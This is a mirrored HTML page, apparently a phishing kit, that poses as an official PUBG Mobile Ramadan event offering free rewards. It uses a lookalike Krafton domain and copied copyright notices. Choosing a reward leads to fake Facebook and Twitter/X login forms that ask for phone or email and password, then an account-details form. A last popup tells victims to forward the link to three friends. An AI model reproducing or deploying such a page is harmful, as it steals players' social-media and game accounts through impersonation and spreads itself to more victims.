...
<!-- Mirrored from kraftons-mobile.com/kr/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Mar 2024 16:46:17 GMT -->
...
<meta property="og:image" content="../../www.pubgmobile.com/images/event/Iridescencex_suit/share/en.jpg">
...
<link rel="icon" href="../../www.pubgmobile.com/images/event/home/pubg_icon.png">
</head>
...
.navbar {
	background: url(../../i.ibb.co/Cmq3C1n/navbar.jpg) top center / 100% no-repeat;
	width: 100%;
	height: 65px;
}
.event-theme {
...
<div class="event-notification-content"><i class="zmdi zmdi-chevron-right"></i>عروض شهر رمضان المبارك <div class="event-notification-content-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div></div> <!--- event-notification-content --->
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.jpg">500</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.jpg">500</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.jpg">500</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.jpg">500</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.jpg">500</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.jpg">500</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.jpg">500</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.jpg">500</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.jpg">500</button>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<img class="footer-copyright-icon" src="https://postimg.cc/hhD77gbk">
<div class="footer-txt-copyright">ⓒ 2024 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2024 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
...
<div class="nav-popup-title">تأكيد الإسترداد</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">هل انت متأكد من الإسترداد الان </div> <!--- popup-alert --->
...
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">إسترداد</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->
...
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">تسجيل الدخول</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">يجب عليك التسجيل اولآ</div> <!--- popup-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> تسجيل الدخول باستخدام حساب الفيسبوك</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> تسجيل الدخول باستخدام حساب(التويتر) X </button>
<br>
</div> <!--- popup-box-bg --->
...
<div class="navbar-fb"><img src="../../i.ibb.co/Wg8qQxh/facebook-text.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://newsy.elsob7.com/wp-content/uploads/2024/02/%D9%84%D8%B9%D8%A8%D8%A9-%D8%A8%D8%A8%D8%AC%D9%8A-%D9%85%D9%88%D8%A8%D8%A7%D9%8A%D9%84.png">
<div class="txt-login-fb">قم بتسجيل الدخول إلى حسابك على الفيسبوك المرتبط ب ببجي موبايل</div> <!--- txt-login-fb --->
<form action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="رقم الهاتف أو البريد الإلكتروني " autocomplete="off" autocapitalize="off" required>
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="كلمة المرور" autocomplete="off" autocapitalize="off" required>
...
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">تسجيل الدخول</button>
</form>
</div> <!--- content-box-fb--->
<div class="language-box">
<center>
<div class="language-name language-name-active">العربية</div> <!--- language-name --->
...
<center>
<img src="../../i.ibb.co/V9rgBqw/twitter-text.png">
</center>
<div class="box-twitter">
<center>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter">قم بتسجيل الدخول إلى حسابك على تويتر المرتبط ب ببجي موبايل</div> <!--- txt-login-twitter --->
<div class="input-box-twitter">
<label>رقم الهاتف أو البريد الإلكتروني أو اسم مستخدم</label>
...
<div class="footer-menu-twitter">هل نسيت كلمه المرور</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter">قم بتسجيل في تويتر</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- header-twitter --->
...
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">تأكيد البيانات</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">أكمل بيانات حسابك </div> <!--- popup-alert --->
...
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">تأكيد</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box --->
</div> <!--- popup --->
...
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">تم إكمال البيانات</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
✅ تم التسجيل
...
مرحباً ايها الجندي
<div>
 يجب عليك الآن نسخ الرابط وارساله إلي 3 من أصدقائك حتي تصلك الشدات
</div> <!--- popup-alert --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://pubgmobile.com/';"> موافق </button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->
...
<!-- Mirrored from kraftons-mobile.com/kr/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Mar 2024 16:46:45 GMT -->
</html>